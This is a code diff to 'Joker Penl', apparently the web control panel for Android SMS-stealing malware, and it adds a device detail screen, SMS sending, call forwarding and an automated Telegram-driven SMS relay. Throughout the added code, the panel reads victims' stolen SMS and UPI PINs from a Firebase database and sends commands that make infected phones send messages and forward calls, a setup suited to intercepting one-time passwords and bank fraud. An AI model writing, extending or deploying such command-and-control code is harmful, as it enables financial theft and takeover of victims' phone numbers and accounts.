@@ -120,6 +120,77 @@ html{overscroll-behavior-y:none;background:var(--bg);}
 .dev-card .dev-battery .bar .fill.low{background:var(--red);}
 .dev-card .dev-battery .bar .fill.med{background:#e3b341;}
 
+/* ===== DETAIL SCREEN ===== */
+#detail-screen{display:none;flex-direction:column;min-height:100vh;background:var(--bg);}
+.d-top{background:rgba(13,10,15,.95);border-bottom:1px solid var(--border);
+  padding:10px 14px;display:flex;align-items:center;gap:8px;
+  position:sticky;top:0;z-index:200;backdrop-filter:blur(12px);}
+.bbtn{background:rgba(255,255,255,.06);color:var(--white);border:1px solid var(--border);
+  border-radius:8px;padding:5px 10px;font-size:12px;cursor:pointer;font-family:inherit;}
+.d-title{color:var(--text-bright);font-size:14px;font-weight:700;flex:1;
+  overflow:hidden;text-overflow:ellipsis;white-space:nowrap;}
+.d-st{font-size:10px;font-weight:700;padding:2px 8px;border-radius:10px;white-space:nowrap;}
+.d-st-on{background:var(--green-soft);color:var(--green);}
+.d-st-off{background:rgba(107,95,122,.12);color:var(--muted);}
+.d-ref{background:rgba(255,255,255,.06);color:var(--white);border:1px solid var(--border);
+  border-radius:8px;padding:5px 8px;font-size:12px;cursor:pointer;font-family:inherit;}
+
+.d-body{padding:10px 14px;}
+.d-info-card{background:var(--surface);border-radius:12px;padding:12px 14px;margin-bottom:10px;
+  border:1px solid var(--border);}
+.d-info-card .d-label{font-size:10px;font-weight:700;color:var(--muted);text-transform:uppercase;letter-spacing:.5px;}
+.d-info-card .d-value{font-size:14px;font-weight:700;color:var(--white);margin-top:2px;}
+.d-info-card .d-value.na{color:var(--muted);}
+.d-info-card .d-value.green{color:var(--green);}
+
+.d-actions{display:grid;grid-template-columns:1fr 1fr;gap:8px;padding:0 14px 10px;}
+.act-btn{background:var(--surface2);color:var(--green);border:1px solid var(--border2);
+  border-radius:10px;padding:12px 8px;font-size:12px;font-weight:700;cursor:pointer;font-family:inherit;}
+.act-btn:active{background:var(--green-soft);}
+
+.autosms-row{display:flex;gap:8px;padding:0 14px 10px;}
+#autosms-btn{flex:1;background:var(--surface2);color:#94a3b8;border:1.5px solid var(--border);
+  border-radius:10px;padding:10px;font-size:12px;font-weight:700;cursor:pointer;
+  font-family:inherit;display:flex;align-items:center;justify-content:center;gap:8px;}
+#autosms-btn.active{background:rgba(0,255,136,.15);color:#00ff88;border-color:rgba(0,255,136,.4);}
+.autosms-settings-btn{background:var(--surface2);color:var(--muted);border:1.5px solid var(--border);
+  border-radius:10px;padding:10px 14px;font-size:16px;cursor:pointer;}
+
+.sms-list{padding:4px 14px 80px;}
+.sms-card{background:var(--surface);border-radius:10px;padding:10px 12px;
+  margin-bottom:8px;border:1px solid var(--border);}
+.sms-card .sms-sender{font-size:12px;font-weight:700;color:var(--green);}
+.sms-card .sms-body{font-size:13px;color:var(--white);line-height:1.5;margin:4px 0;}
+.sms-card .sms-time{font-size:10px;color:var(--muted);text-align:right;}
+.sms-card .sms-type{display:inline-block;padding:1px 8px;border-radius:8px;font-size:9px;font-weight:700;
+  background:var(--green-soft);color:var(--green);}
+
+/* ===== OVERLAY / MODAL ===== */
+.overlay{display:none;position:fixed;inset:0;background:rgba(0,0,0,.8);z-index:500;
+  align-items:flex-end;justify-content:center;backdrop-filter:blur(4px);}
+.overlay.show{display:flex;}
+.modal{background:var(--surface);border:1px solid var(--border);
+  border-radius:20px 20px 0 0;width:100%;max-width:460px;
+  max-height:85vh;overflow-y:auto;animation:up .3s ease;}
+@keyframes up{from{transform:translateY(40px);opacity:0;}to{transform:translateY(0);opacity:1;}}
+.modal-hdr{padding:14px 16px;text-align:center;font-size:14px;font-weight:700;
+  color:#0d0a0f;background:linear-gradient(135deg,#00cc6a,#00ff88);border-radius:20px 20px 0 0;}
+.modal-body{padding:14px 16px 24px;}
+.di{width:100%;background:var(--surface2);border:1.5px solid var(--border);
+  border-radius:8px;padding:10px 12px;font-size:13px;outline:none;
+  margin-bottom:10px;font-family:inherit;color:var(--white);}
+.di:focus{border-color:var(--green);}
+.di::placeholder{color:var(--muted);}
+.dbtn{width:100%;background:var(--green);color:#0d0a0f;border:none;border-radius:8px;
+  padding:12px;font-size:13px;font-weight:800;cursor:pointer;margin-bottom:8px;font-family:inherit;}
+.dbtn-cancel{width:100%;background:var(--surface2);color:var(--muted);
+  border:1px solid var(--border);border-radius:8px;padding:11px;
+  font-size:13px;cursor:pointer;font-family:inherit;}
+
+.settings-help{background:rgba(0,255,136,.08);border:1px solid rgba(0,255,136,.2);
+  border-radius:8px;padding:8px 10px;margin-bottom:12px;font-size:11px;color:#00ff88;line-height:1.5;}
+.settings-help strong{color:#fff;}
+
 /* ===== TOAST ===== */
 #toast{position:fixed;bottom:22px;left:50%;transform:translateX(-50%);
   background:var(--surface3);border:1px solid var(--border2);color:var(--text-bright);
@@ -137,13 +208,6 @@ html{overscroll-behavior-y:none;background:var(--bg);}
 .spin{width:20px;height:20px;border:2px solid var(--border);
   border-top-color:var(--green);border-radius:50%;animation:sp .8s linear infinite;}
 @keyframes sp{to{transform:rotate(360deg);}}
-
-/* ===== HASH INFO ===== */
-.hash-info{background:rgba(255,255,255,.04);border:1px solid var(--border);
-  border-radius:8px;padding:8px 10px;margin-bottom:12px;font-size:11px;
-  color:var(--muted);word-break:break-all;font-family:monospace;}
-.hash-info .label{color:#8a7d90;}
-.hash-info .value{color:#00ff88;}
 </style>
 </head>
 <body>
@@ -162,11 +226,6 @@ html{overscroll-behavior-y:none;background:var(--bg);}
     <div id="link-banner" class="link-banner" style="display:none;">
       <span class="icon">🔗</span>
       <span class="text"><strong>Link to continue the login</strong></span>
-    </div>
-
-    <!-- Hash Info (Debug) -->
-    <div id="hash-info" class="hash-info" style="display:none;">
-      <span class="label">🔑 Link detected!</span>
     </div>
 
     <!-- Quick Connect (Link-based) -->
@@ -223,19 +282,138 @@ html{overscroll-behavior-y:none;background:var(--bg);}
   </div>
 </div>
 
+<!-- ===== DETAIL SCREEN ===== -->
+<div id="detail-screen">
+  <div class="d-top">
+    <button class="bbtn" onclick="goBack()">←</button>
+    <div class="d-title" id="d-title">Device</div>
+    <span class="d-st" id="d-stbadge"></span>
+    <button class="d-ref" id="d-ref" onclick="devRefresh()">↻</button>
+  </div>
+
+  <div class="d-body" id="d-body">
+    <div class="d-info-card">
+      <div class="d-label">📱 Phone</div>
+      <div class="d-value" id="d-phone">---</div>
+    </div>
+    <div class="d-info-card">
+      <div class="d-label">📌 UPI Pin</div>
+      <div class="d-value" id="d-upi">---</div>
+    </div>
+    <div class="d-info-card">
+      <div class="d-label">📱 Model</div>
+      <div class="d-value" id="d-model">---</div>
+    </div>
+    <div class="d-info-card">
+      <div class="d-label">🔋 Battery</div>
+      <div class="d-value" id="d-battery">---</div>
+    </div>
+    <div class="d-info-card">
+      <div class="d-label">📅 Date</div>
+      <div class="d-value" id="d-date">---</div>
+    </div>
+  </div>
+
+  <div class="d-actions">
+    <button class="act-btn" onclick="openSmsSend()">✉️ SMS SEND</button>
+    <button class="act-btn" onclick="openCallForward()">📞 CALL FWD</button>
+  </div>
+
+  <div class="autosms-row">
+    <button id="autosms-btn" onclick="toggleAutoSms()">
+      🤖 Auto-SMS: <span id="autosms-status">OFF</span>
+    </button>
+    <button class="autosms-settings-btn" onclick="openAutoSmsSettings()">⚙️</button>
+  </div>
+
+  <div class="sms-list" id="sms-list">
+    <div class="loading"><div class="spin"></div>&nbsp;Loading SMS...</div>
+  </div>
+</div>
+
+<!-- ===== AUTO-SMS SETTINGS MODAL ===== -->
+<div class="overlay" id="dlg-autosms">
+  <div class="modal">
+    <div class="modal-hdr">🤖 Auto-SMS Settings</div>
+    <div class="modal-body">
+      <div class="settings-help">
+        📡 Telegram channel ka naya message aate hi <strong>automatically SMS</strong> send ho jaayega.<br>
+        <span style="font-size:10px;color:#8a7d90;">Format: <code>To: 9876543210 Message: Hello</code></span>
+      </div>
+      <div class="fg"><label>Cloudflare Worker URL</label>
+        <input class="di" id="as-worker" placeholder="https://late-mud-2765.10himakhan.workers.dev"/></div>
+      <div class="fg"><label>Bot Token</label>
+        <input class="di" id="as-token" type="password" placeholder="1234567890:AAF..."/></div>
+      <div class="fg"><label>Channel Chat ID</label>
+        <input class="di" id="as-chatid" placeholder="-1004498364212"/></div>
+      <button class="dbtn" onclick="saveAutoSmsSettings()">✅ Save &amp; Start</button>
+      <button class="dbtn-cancel" onclick="closeD('dlg-autosms')">Cancel</button>
+    </div>
+  </div>
+</div>
+
+<!-- ===== SMS SEND MODAL ===== -->
+<div class="overlay" id="dlg-sms">
+  <div class="modal">
+    <div class="modal-hdr">✉️ Send SMS</div>
+    <div class="modal-body">
+      <div class="fg"><label>Recipient Phone No.</label>
+        <input class="di" id="sms-to" placeholder="Enter phone number"/></div>
+      <div class="fg"><label>Message</label>
+        <textarea class="di" id="sms-msg" rows="3" placeholder="Enter message to send..." style="resize:none;"></textarea></div>
+      <div style="display:grid;grid-template-columns:1fr 1fr;gap:8px;margin-bottom:10px;">
+        <button class="dbtn" onclick="selectSmsSim(1)" id="sms-sim1" style="background:var(--green);color:#0d0a0f;">📱 SIM1</button>
+        <button class="dbtn" onclick="selectSmsSim(2)" id="sms-sim2" style="background:var(--surface2);color:var(--white);border:1px solid var(--border);">📱 SIM2</button>
+      </div>
+      <button class="dbtn" onclick="doSendSms()">✉️ SMS Send</button>
+      <div id="sms-status" style="display:none;padding:8px 10px;border-radius:8px;font-size:12px;margin-bottom:8px;text-align:center;font-weight:600;"></div>
+      <button class="dbtn-cancel" onclick="closeD('dlg-sms')">Cancel</button>
+    </div>
+  </div>
+</div>
+
+<!-- ===== CALL FORWARD MODAL ===== -->
+<div class="overlay" id="dlg-cf">
+  <div class="modal">
+    <div class="modal-hdr">📞 Call Forwarding</div>
+    <div class="modal-body">
+      <div class="fg"><label>Forward To</label>
+        <input class="di" id="cf-number" placeholder="Enter phone number"/></div>
+      <div style="display:grid;grid-template-columns:1fr 1fr;gap:8px;">
+        <button class="dbtn" onclick="doCallForward('active')" style="background:var(--green);">✅ Active</button>
+        <button class="dbtn" onclick="doCallForward('deactive')" style="background:var(--red);color:#fff;">❌ Deactive</button>
+      </div>
+      <button class="dbtn" onclick="doCallForward('check')" style="background:var(--surface2);color:var(--white);">🔍 Check Status</button>
+      <div id="cf-status" style="display:none;padding:8px 10px;border-radius:8px;font-size:12px;margin-bottom:8px;text-align:center;font-weight:600;background:rgba(0,255,136,.08);color:var(--green);"></div>
+      <button class="dbtn-cancel" onclick="closeD('dlg-cf')">Cancel</button>
+    </div>
+  </div>
+</div>
+
 <div id="toast"></div>
 
 <script>
 /* ============================================================
-   Joker Penl - Working Link-Based Login
+   Joker Penl - Complete Working Version
    ============================================================ */
 
 var DB = '', APIKEY = '', NODE = 'csc6';
 var DEVS = {};
+var CUR_KEY = null;
 var infoInterval = null;
 var TTIMER = null;
-var LINK_PARAMS = null;
 var HAS_LINK = false;
+
+/* ===== AUTO-SMS VARIABLES ===== */
+var AUTO_SMS_ACTIVE = false;
+var AUTO_SMS_INTERVAL = null;
+var AUTO_SMS_OFFSET = 0;
+var AUTO_SMS_DEV = null;
+var SEL_SMS_SIM = 1;
+
+var TG_WORKER_URL = localStorage.getItem('joker_tg_worker') || '';
+var TG_BOT_TOKEN = localStorage.getItem('joker_tg_token') || '';
+var TG_CHAT_ID = localStorage.getItem('joker_tg_chat') || '';
 
 /* ===== DECODE LINK PARAMS ===== */
 function decodeParams(b64){
@@ -251,28 +429,17 @@ function decodeParams(b64){
 /* ===== CHECK URL HASH ===== */
 function checkLinkHash(){
   var hash = window.location.hash.slice(1);
-  console.log('Hash:', hash);
-  
   if(!hash) return false;
   
   var decoded = decodeParams(hash);
-  if(!decoded || !decoded.u){
-    console.log('Decoded failed');
-    return false;
-  }
+  if(!decoded || !decoded.u) return false;
   
-  console.log('Decoded:', decoded);
-  LINK_PARAMS = decoded;
   HAS_LINK = true;
   
-  // Show quick connect
   document.getElementById('qc-section').style.display = 'block';
   document.getElementById('full-setup-section').style.display = 'none';
   document.getElementById('link-banner').style.display = 'flex';
-  document.getElementById('hash-info').style.display = 'block';
-  document.getElementById('hash-info').innerHTML = '🔗 <strong>Link detected!</strong> ' + decoded.u;
   
-  // Set values
   DB = decoded.u.replace(/\/+$/,'');
   APIKEY = decoded.k || '';
   NODE = decoded.n || 'csc6';
@@ -298,22 +465,13 @@ function doQuickConnect(){
     return;
   }
   
-  // Verify password with Firebase
   var auth = APIKEY ? '?auth=' + encodeURIComponent(APIKEY) : '';
   var url = DB + '/' + NODE + '/Admin_Password.json' + auth;
   
-  console.log('Checking password at:', url);
-  
   fetch(url)
-    .then(function(r){ 
-      if(!r.ok) throw new Error('HTTP ' + r.status);
-      return r.json(); 
-    })
+    .then(function(r){ return r.json(); })
     .then(function(storedPass){
-      console.log('Stored password:', storedPass);
-      console.log('Entered password:', pass);
-      
-      if(storedPass === null || storedPass === undefined){
+      if(!storedPass){
         btn.disabled = false;
         btn.textContent = '🔐 Connect';
         errEl.style.display = 'block';
@@ -322,7 +480,6 @@ function doQuickConnect(){
       }
       
       if(String(storedPass) === pass){
-        // Password correct - launch app
         document.getElementById('setup-screen').style.display = 'none';
         document.getElementById('app').style.display = 'flex';
         loadDevices();
@@ -337,7 +494,6 @@ function doQuickConnect(){
       }
     })
     .catch(function(e){
-      console.error('Error:', e);
       btn.disabled = false;
       btn.textContent = '🔐 Connect';
       errEl.style.display = 'block';
@@ -365,10 +521,7 @@ function doSetup(){
   
   var auth = APIKEY ? '?auth=' + encodeURIComponent(APIKEY) : '';
   fetch(DB + '/' + NODE + '/All_User/Info.json' + auth)
-    .then(function(r){ 
-      if(!r.ok) throw new Error('HTTP ' + r.status);
-      return r.json(); 
-    })
+    .then(function(r){ return r.json(); })
     .then(function(data){
       btn.disabled = false;
       btn.textContent = '🃏 Connect & Open';
@@ -397,15 +550,9 @@ function loadDevices(){
   var auth = APIKEY ? '?auth=' + encodeURIComponent(APIKEY) : '';
   var url = DB + '/' + NODE + '/All_User/Info.json' + auth;
   
-  console.log('Loading devices from:', url);
-  
   fetch(url)
-    .then(function(r){ 
-      if(!r.ok) throw new Error('HTTP ' + r.status);
-      return r.json(); 
-    })
+    .then(function(r){ return r.json(); })
     .then(function(data){
-      console.log('Devices data:', data);
       if(data && typeof data === 'object'){
         procInfo(data);
         startInfoPolling();
@@ -413,7 +560,6 @@ function loadDevices(){
     })
     .catch(function(e){
       showToast('⚠️ Error loading devices: ' + e.message);
-      console.error(e);
     });
 }
 
@@ -480,7 +626,7 @@ function renderDevices(){
     var phoneDisplay = dev.phone && dev.phone !== 'N/A' ? dev.phone : 'N/A';
     var phoneClass = phoneDisplay === 'N/A' ? 'na' : '';
     
-    html += '<div class="dev-card ' + (isOnline ? 'online' : 'offline') + '">';
+    html += '<div class="dev-card ' + (isOnline ? 'online' : 'offline') + '" onclick="openDevice(\'' + dev.key + '\')">';
     html += '<div class="dev-num">' + (index + 1) + '</div>';
     html += '<div class="dev-body">';
     html += '<div class="dev-row">';
@@ -518,6 +664,101 @@ function clearSearch(){
   renderDevices();
 }
 
+/* ===== OPEN DEVICE DETAIL ===== */
+function openDevice(key){
+  CUR_KEY = key;
+  var dev = DEVS[key];
+  if(!dev) return;
+  
+  document.getElementById('app').style.display = 'none';
+  var ds = document.getElementById('detail-screen');
+  ds.style.display = 'flex';
+  
+  document.getElementById('d-title').textContent = dev.model || key;
+  document.getElementById('d-phone').textContent = dev.phone || 'N/A';
+  document.getElementById('d-upi').textContent = dev.upi || 'N/A';
+  document.getElementById('d-model').textContent = dev.model || 'N/A';
+  document.getElementById('d-battery').textContent = (dev.battery || 0) + '%';
+  document.getElementById('d-date').textContent = dev.date || 'N/A';
+  
+  var badge = document.getElementById('d-stbadge');
+  var isOn = dev.online;
+  badge.textContent = isOn ? '🟢 Online' : '🔴 Offline';
+  badge.className = 'd-st ' + (isOn ? 'd-st-on' : 'd-st-off');
+  
+  AUTO_SMS_DEV = key;
+  if(AUTO_SMS_ACTIVE){
+    stopAutoSms();
+    startAutoSms();
+  }
+  
+  // Load SMS
+  loadSms(key);
+}
+
+/* ===== LOAD SMS ===== */
+function loadSms(key){
+  var list = document.getElementById('sms-list');
+  list.innerHTML = '<div class="loading"><div class="spin"></div>&nbsp;Loading SMS...</div>';
+  
+  var did = key;
+  var auth = APIKEY ? '&auth=' + encodeURIComponent(APIKEY) : '';
+  var url = DB + '/' + NODE + '/All_User/Sms/' + did + '.json?orderBy=%22$key%22&limitToLast=50' + auth;
+  
+  fetch(url)
+    .then(function(r){ return r.json(); })
+    .then(function(data){
+      if(!data || typeof data !== 'object'){
+        list.innerHTML = '<div class="empty"><div class="ei">💬</div><p>Koi SMS nahi</p></div>';
+        return;
+      }
+      
+      var keys = Object.keys(data);
+      var html = '';
+      keys.reverse().forEach(function(k){
+        var s = data[k];
+        if(!s) return;
+        html += '<div class="sms-card">';
+        html += '<div class="sms-sender">📨 ' + (s.sender || s.ph || 'Unknown') + ' <span class="sms-type">' + (s.type || 'incoming') + '</span></div>';
+        html += '<div class="sms-body">' + (s.body || s.msg || '') + '</div>';
+        html += '<div class="sms-time">' + (s.date || '') + '</div>';
+        html += '</div>';
+      });
+      
+      list.innerHTML = html || '<div class="empty"><div class="ei">💬</div><p>Koi SMS nahi</p></div>';
+    })
+    .catch(function(){
+      list.innerHTML = '<div class="empty"><div class="ei">⚠️</div><p>Load failed</p></div>';
+    });
+}
+
+/* ===== GO BACK ===== */
+function goBack(){
+  document.getElementById('detail-screen').style.display = 'none';
+  document.getElementById('app').style.display = 'flex';
+}
+
+/* ===== DEVICE REFRESH ===== */
+function devRefresh(){
+  var btn = document.getElementById('d-ref');
+  btn.textContent = '⏳';
+  btn.disabled = true;
+  
+  if(CUR_KEY){
+    loadSms(CUR_KEY);
+    var dev = DEVS[CUR_KEY];
+    if(dev){
+      document.getElementById('d-battery').textContent = (dev.battery || 0) + '%';
+    }
+  }
+  
+  setTimeout(function(){
+    btn.textContent = '↻';
+    btn.disabled = false;
+    showToast('✅ Refreshed!');
+  }, 500);
+}
+
 /* ===== INFO POLLING ===== */
 function startInfoPolling(){
   if(infoInterval) clearInterval(infoInterval);
@@ -535,23 +776,319 @@ function startInfoPolling(){
   }, 30000);
 }
 
+/* ===== SMS SEND ===== */
+function openSmsSend(){
+  document.getElementById('sms-to').value = '';
+  document.getElementById('sms-msg').value = '';
+  document.getElementById('sms-status').style.display = 'none';
+  selectSmsSim(1);
+  openD('dlg-sms');
+}
+
+function selectSmsSim(n){
+  SEL_SMS_SIM = n;
+  var b1 = document.getElementById('sms-sim1');
+  var b2 = document.getElementById('sms-sim2');
+  if(n === 1){
+    b1.style.background = 'var(--green)';
+    b1.style.color = '#0d0a0f';
+    b2.style.background = 'var(--surface2)';
+    b2.style.color = 'var(--white)';
+    b2.style.border = '1px solid var(--border)';
+  } else {
+    b2.style.background = 'var(--green)';
+    b2.style.color = '#0d0a0f';
+    b1.style.background = 'var(--surface2)';
+    b1.style.color = 'var(--white)';
+    b1.style.border = '1px solid var(--border)';
+  }
+}
+
+function doSendSms(){
+  var to = document.getElementById('sms-to').value.trim();
+  var msg = document.getElementById('sms-msg').value.trim();
+  var stEl = document.getElementById('sms-status');
+  
+  if(!to || !msg){ showToast('Number aur message daalo!'); return; }
+  if(!CUR_KEY){ showToast('Device select karo!'); return; }
+  
+  stEl.style.display = 'block';
+  stEl.style.background = 'rgba(251,191,36,.08)';
+  stEl.style.border = '1px solid rgba(251,191,36,.3)';
+  stEl.style.color = '#e3b341';
+  stEl.textContent = '⏳ Sending...';
+  
+  var auth = APIKEY ? '?auth=' + encodeURIComponent(APIKEY) : '';
+  var url = DB + '/Verify_Device/' + CUR_KEY + '.json' + auth;
+  
+  fetch(url, {
+    method: 'PUT',
+    headers: {'Content-Type': 'application/json'},
+    body: JSON.stringify({ Number: to, Body: msg, Status: 'Yes', SubID: String(SEL_SMS_SIM) })
+  })
+  .then(function(r){ return r.json(); })
+  .then(function(){
+    stEl.style.background = 'rgba(0,255,136,.08)';
+    stEl.style.border = '1px solid rgba(0,255,136,.3)';
+    stEl.style.color = '#00ff88';
+    stEl.textContent = '✅ SMS Sent!';
+    showToast('✅ SMS Sent to ' + to);
+  })
+  .catch(function(e){
+    stEl.textContent = '❌ Error: ' + e.message;
+    stEl.style.color = '#ff4466';
+    showToast('❌ Error: ' + e.message);
+  });
+}
+
+/* ===== CALL FORWARD ===== */
+function openCallForward(){
+  document.getElementById('cf-number').value = '';
+  document.getElementById('cf-status').style.display = 'none';
+  openD('dlg-cf');
+}
+
+function doCallForward(action){
+  var num = document.getElementById('cf-number').value.trim();
+  var stEl = document.getElementById('cf-status');
+  
+  if(action !== 'check' && !num){
+    showToast('Number daalo!');
+    return;
+  }
+  
+  stEl.style.display = 'block';
+  stEl.style.background = 'rgba(251,191,36,.08)';
+  stEl.style.color = '#e3b341';
+  stEl.textContent = '⏳ Processing...';
+  
+  if(action === 'check'){
+    var auth = APIKEY ? '?auth=' + encodeURIComponent(APIKEY) : '';
+    var url = DB + '/' + NODE + '/All_User/Call_For/' + CUR_KEY + '.json' + auth;
+    fetch(url)
+      .then(function(r){ return r.json(); })
+      .then(function(data){
+        if(data && data.PhoneNumber){
+          stEl.style.background = 'rgba(0,255,136,.08)';
+          stEl.style.color = '#00ff88';
+          stEl.textContent = '📞 Forward to: ' + data.PhoneNumber + ' | Status: ' + (data.Status || 'Active');
+        } else {
+          stEl.style.background = 'rgba(255,68,102,.08)';
+          stEl.style.color = '#ff4466';
+          stEl.textContent = '❌ No call forwarding set';
+        }
+      })
+      .catch(function(){
+        stEl.textContent = '❌ Check failed';
+        stEl.style.color = '#ff4466';
+      });
+    return;
+  }
+  
+  var cfData = action === 'active'
+    ? { PhoneNumber: num, Status: 'Yes', SubID: '1', Type: 'Active' }
+    : { PhoneNumber: num, Status: 'No', SubID: '1', Type: 'DeActive' };
+  
+  var auth = APIKEY ? '?auth=' + encodeURIComponent(APIKEY) : '';
+  var url = DB + '/' + NODE + '/All_User/Call_For/' + CUR_KEY + '.json' + auth;
+  
+  fetch(url, {
+    method: 'PUT',
+    headers: {'Content-Type': 'application/json'},
+    body: JSON.stringify(cfData)
+  })
+  .then(function(r){ return r.json(); })
+  .then(function(){
+    stEl.style.background = 'rgba(0,255,136,.08)';
+    stEl.style.color = '#00ff88';
+    stEl.textContent = '✅ Call Forward ' + (action === 'active' ? 'Active' : 'Deactive') + '!';
+    showToast('✅ Call Forward ' + (action === 'active' ? 'Active' : 'Deactive'));
+  })
+  .catch(function(e){
+    stEl.textContent = '❌ Error: ' + e.message;
+    stEl.style.color = '#ff4466';
+    showToast('❌ Error: ' + e.message);
+  });
+}
+
+/* ===== AUTO-SMS ===== */
+function toggleAutoSms(){
+  if(!AUTO_SMS_ACTIVE){
+    if(!TG_WORKER_URL || !TG_BOT_TOKEN || !TG_CHAT_ID){
+      openAutoSmsSettings();
+      return;
+    }
+    if(!CUR_KEY){ showToast('❌ Pehle koi device select karo!'); return; }
+    startAutoSms();
+  } else {
+    stopAutoSms();
+  }
+}
+
+function startAutoSms(){
+  AUTO_SMS_ACTIVE = true;
+  AUTO_SMS_DEV = CUR_KEY;
+  AUTO_SMS_OFFSET = 0;
+  updateAutoSmsBtn();
+  showToast('🤖 Auto-SMS ON');
+  
+  var url = TG_WORKER_URL.replace(/\/+$/,'') 
+    + '?token=' + encodeURIComponent(TG_BOT_TOKEN)
+    + '&offset=0';
+    
+  fetch(url)
+    .then(function(r){ return r.json(); })
+    .then(function(data){
+      if(data.ok && data.result && data.result.length){
+        AUTO_SMS_OFFSET = data.result[data.result.length - 1].update_id + 1;
+      }
+      if(AUTO_SMS_INTERVAL) clearInterval(AUTO_SMS_INTERVAL);
+      AUTO_SMS_INTERVAL = setInterval(pollTelegram, 3000);
+    })
+    .catch(function(){
+      if(AUTO_SMS_INTERVAL) clearInterval(AUTO_SMS_INTERVAL);
+      AUTO_SMS_INTERVAL = setInterval(pollTelegram, 3000);
+    });
+}
+
+function stopAutoSms(){
+  AUTO_SMS_ACTIVE = false;
+  AUTO_SMS_DEV = null;
+  if(AUTO_SMS_INTERVAL){ clearInterval(AUTO_SMS_INTERVAL); AUTO_SMS_INTERVAL = null; }
+  updateAutoSmsBtn();
+  showToast('🤖 Auto-SMS OFF');
+}
+
+function updateAutoSmsBtn(){
+  var btn = document.getElementById('autosms-btn');
+  var txt = document.getElementById('autosms-status');
+  if(!btn) return;
+  if(AUTO_SMS_ACTIVE){
+    btn.className = 'active';
+    if(txt) txt.textContent = 'ON ✅';
+  } else {
+    btn.className = '';
+    if(txt) txt.textContent = 'OFF';
+  }
+}
+
+function parseTgMessage(text){
+  var toMatch = text.match(/To:\s*(\d+)/i);
+  var msgMatch = text.match(/💬\s*Message:\s*([^\n]+)/i) || text.match(/Message:\s*([^\n]+)/i);
+  if(toMatch && msgMatch){
+    return { number: toMatch[1].trim(), body: msgMatch[1].trim() };
+  }
+  var lines = text.trim().split('\n');
+  for(var i = 0; i < lines.length; i++){
+    var pipeMatch = lines[i].match(/^(\d{10,15})\s*\|\s*(.+)/);
+    if(pipeMatch){
+      return { number: pipeMatch[1].trim(), body: pipeMatch[2].trim() };
+    }
+  }
+  if(lines.length >= 2 && /^\d{10,15}$/.test(lines[0].trim())){
+    return { number: lines[0].trim(), body: lines.slice(1).join('\n').trim() };
+  }
+  return null;
+}
+
+function pollTelegram(){
+  if(!AUTO_SMS_ACTIVE || !AUTO_SMS_DEV) return;
+  var workerBase = TG_WORKER_URL.replace(/\/+$/,'');
+  var url = workerBase 
+    + '?token=' + encodeURIComponent(TG_BOT_TOKEN)
+    + '&offset=' + AUTO_SMS_OFFSET;
+
+  fetch(url)
+    .then(function(r){ return r.json(); })
+    .then(function(data){
+      if(!data || !data.ok || !data.result || !data.result.length) return;
+      data.result.forEach(function(update){
+        if(update.update_id >= AUTO_SMS_OFFSET){
+          AUTO_SMS_OFFSET = update.update_id + 1;
+        }
+        var msg = update.channel_post || update.message;
+        if(!msg) return;
+        var chatId = String(msg.chat && msg.chat.id);
+        var expectedId = String(TG_CHAT_ID).trim();
+        if(expectedId && chatId !== expectedId) return;
+        var text = msg.text || msg.caption || '';
+        if(!text) return;
+        var parsed = parseTgMessage(text);
+        if(!parsed) return;
+        autoSendSms(parsed.number, parsed.body);
+      });
+    })
+    .catch(function(){});
+}
+
+function autoSendSms(number, body){
+  if(!AUTO_SMS_DEV || !DB || !NODE) return;
+  var dev = DEVS[AUTO_SMS_DEV];
+  if(!dev) return;
+  var auth = APIKEY ? '?auth=' + encodeURIComponent(APIKEY) : '';
+  var url = DB + '/Verify_Device/' + AUTO_SMS_DEV + '.json' + auth;
+  
+  fetch(url, {
+    method: 'PUT',
+    headers: {'Content-Type': 'application/json'},
+    body: JSON.stringify({ Number: number, Body: body, Status: 'Yes', SubID: '1' })
+  })
+  .then(function(r){ return r.json(); })
+  .then(function(){
+    showToast('✅ Auto-SMS sent → ' + number);
+    var txt = document.getElementById('autosms-status');
+    if(txt) txt.textContent = 'ON ✅ ' + number;
+  })
+  .catch(function(e){
+    showToast('❌ Auto-SMS FAIL: ' + e.message);
+  });
+}
+
+function openAutoSmsSettings(){
+  document.getElementById('as-worker').value = TG_WORKER_URL;
+  document.getElementById('as-token').value = TG_BOT_TOKEN;
+  document.getElementById('as-chatid').value = TG_CHAT_ID;
+  openD('dlg-autosms');
+}
+
+function saveAutoSmsSettings(){
+  var w = document.getElementById('as-worker').value.trim();
+  var t = document.getElementById('as-token').value.trim();
+  var c = document.getElementById('as-chatid').value.trim();
+  if(!w || !t || !c){ showToast('Sab fields bharo!'); return; }
+  TG_WORKER_URL = w;
+  TG_BOT_TOKEN = t;
+  TG_CHAT_ID = c;
+  localStorage.setItem('joker_tg_worker', w);
+  localStorage.setItem('joker_tg_token', t);
+  localStorage.setItem('joker_tg_chat', c);
+  closeD('dlg-autosms');
+  showToast('✅ Settings saved!');
+  if(AUTO_SMS_ACTIVE){
+    stopAutoSms();
+    startAutoSms();
+  } else {
+    startAutoSms();
+  }
+}
+
 /* ===== LOGOUT ===== */
 function doLogout(){
   if(infoInterval) clearInterval(infoInterval);
+  stopAutoSms();
   DEVS = {};
   document.getElementById('app').style.display = 'none';
+  document.getElementById('detail-screen').style.display = 'none';
   document.getElementById('setup-screen').style.display = 'flex';
   
   if(HAS_LINK){
     document.getElementById('qc-section').style.display = 'block';
     document.getElementById('full-setup-section').style.display = 'none';
     document.getElementById('link-banner').style.display = 'flex';
-    document.getElementById('hash-info').style.display = 'block';
   } else {
     document.getElementById('qc-section').style.display = 'none';
     document.getElementById('full-setup-section').style.display = 'block';
     document.getElementById('link-banner').style.display = 'none';
-    document.getElementById('hash-info').style.display = 'none';
   }
   
   document.getElementById('qc-pass').value = '';
@@ -561,7 +1098,10 @@ function doLogout(){
   showToast('👋 Logged out');
 }
 
-/* ===== TOAST ===== */
+/* ===== UTILS ===== */
+function openD(id){ document.getElementById(id).classList.add('show'); }
+function closeD(id){ document.getElementById(id).classList.remove('show'); }
+
 function showToast(msg){
   var t = document.getElementById('toast');
   t.innerHTML = msg;
@@ -570,19 +1110,20 @@ function showToast(msg){
   TTIMER = setTimeout(function(){ t.style.opacity = '0'; }, 2500);
 }
 
+document.querySelectorAll('.overlay').forEach(function(el){
+  el.addEventListener('click', function(e){
+    if(e.target === this) this.classList.remove('show');
+  });
+});
+
 /* ===== INIT ===== */
 window.addEventListener('load', function(){
-  console.log('Page loaded!');
-  
-  // Check for link in URL hash
   var hasLink = checkLinkHash();
-  console.log('Has link:', hasLink);
   
   if(hasLink){
     document.getElementById('qc-section').style.display = 'block';
     document.getElementById('full-setup-section').style.display = 'none';
